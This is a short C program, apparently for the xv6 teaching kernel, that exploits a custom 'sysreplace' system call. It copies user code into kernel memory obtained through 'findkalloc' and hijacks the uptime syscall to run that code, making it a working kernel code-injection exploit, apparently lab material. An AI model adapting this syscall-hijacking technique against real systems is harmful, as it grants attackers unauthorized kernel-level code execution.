#include"types.h"
#include"user.h"

int (*old_func)(void);
int myuptime(void);
int exploit_stage1(void);
char *ptr;

int main(void)
{
	printf(1,"Uptime value is %d\n",uptime());
	sysreplace(14,(int)exploit_stage1,(int)&old_func);
		
	printf(1,"Address of uptime is  0x%x\n",uptime());
	sysreplace(14,(int)(ptr+4),(int)&old_func);
	printf(1,"Uptime is now %d\n",uptime());
	exit();
}

int myuptime(void) 
{
	register int addr asm("eax");
	int (*old_f)(void);
	asm (
	"call _here;"
	"_here: pop %eax;"
	);
	addr=addr&0xFFFFF000;	
	old_f=(int (*)(void))(*(int*)addr);
	return(old_f()+50000) ;
}

int exploit_stage1(void)
{
	char*(*k)(void)= (char*(*)(void))findkalloc();
	ptr=k();
	memmove(ptr,(char*)&old_func,4);
	memmove(ptr+4,(char*)myuptime,(int)exploit_stage1-(int)myuptime);
	return (int)old_func ;
	
}

